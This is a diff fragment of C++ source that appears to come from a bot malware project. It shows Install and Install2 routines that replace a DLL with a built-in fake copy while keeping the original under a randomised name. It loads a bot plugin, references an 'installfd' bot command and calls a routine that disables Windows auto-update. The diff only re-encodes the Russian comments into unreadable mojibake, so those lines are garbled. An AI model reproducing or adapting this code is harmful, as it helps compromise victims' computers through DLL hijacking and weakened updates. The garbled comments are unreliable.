+		// пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Windows
 		TryDisableAutoUpdateService();
 
 		result = TRUE;
@@ -499,13 +510,13 @@ BOOL InstallForIe()
 	return result;
 }
 
-// Експортируемая ф-ция для запуска установки FakeDll
-// Вызывается из бота по команде installfd
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ-пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ FakeDll
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ installfd
 extern "C" BOOL WINAPI Install( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 {
 	if( bodyBotPlug == 0 || sizeBotPlug == 0 ) return FALSE;
 	BOT::Initialize();
-	// Инициализируем систему отправки статистической информации
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	DebugReportInit();
 
 	FAKEDLLDBG( "FakeInstall", "Started size bot plug=%d", sizeBotPlug );
@@ -519,15 +530,15 @@ extern "C" BOOL WINAPI Install( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 	return res;
 }
 
-//подменяет длл путь к которой fakeDll
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ fakeDll
 extern "C" BOOL WINAPI Install2( const char* fakeDll, BYTE* bodyBotPlug, DWORD sizeBotPlug )
 {
 	BOOL ret = FALSE;
 	BOT::Initialize();
 	if( !File::IsExists((char*)fakeDll) ) return FALSE;
-	char origDll[MAX_PATH]; //путь куда сохраняется оригинальная длл
+	char origDll[MAX_PATH]; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	m_lstrcpy( origDll, fakeDll );
-	//смещаем расширение на один символ вправо
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	int p = m_lstrlen(origDll);
 	origDll[p + 1] = 0;
 	do
@@ -535,22 +546,22 @@ extern "C" BOOL WINAPI Install2( const char* fakeDll, BYTE* bodyBotPlug, DWORD s
 		origDll[p] = origDll[p - 1];
 		p--;
 	} while( origDll[p] != '.' );
-	//добавляем любую цифру к имени длл
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	for( int i = 0; i < 10; i++ )
 	{
 		origDll[p] = ((DWORD)pGetTickCount() % 10) + '0';
-		//если такая есть, то пробуем ставить другую цифру
+		//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		if( !File::IsExists(origDll) )
 		{
-			p = -1; //такого файла нет
+			p = -1; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 			break; 
 		}
 	}
-	if( p >= 0 ) //создать имя не удалось
+	if( p >= 0 ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		return FALSE;
 	}
-	FAKEDLLDBG( "InstallFakeDll", "Подмена %s -> %s", fakeDll, origDll );
+	FAKEDLLDBG( "InstallFakeDll", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ %s -> %s", fakeDll, origDll );
 	DWORD  fakeDllSize = 0;
 	LPVOID fakeDllBody = GetBuiltinFakeDllBody(fakeDllSize);
 	if( fakeDllBody == 0 ) return FALSE;
@@ -582,7 +593,7 @@ extern "C" BOOL WINAPI Install2( const char* fakeDll, BYTE* bodyBotPlug, DWORD s
 
 DWORD WINAPI FakeDllInstallerDllMain(HINSTANCE , DWORD reason, LPVOID )
 {
-//код для тестирования, ложится вместе c bot.plug и запускается "rundll32 bki.plug,qwe"
+//пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ c bot.plug пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ "rundll32 bki.plug,qwe"
 /*
 	BOT::Initialize();
 	BYTE* data;
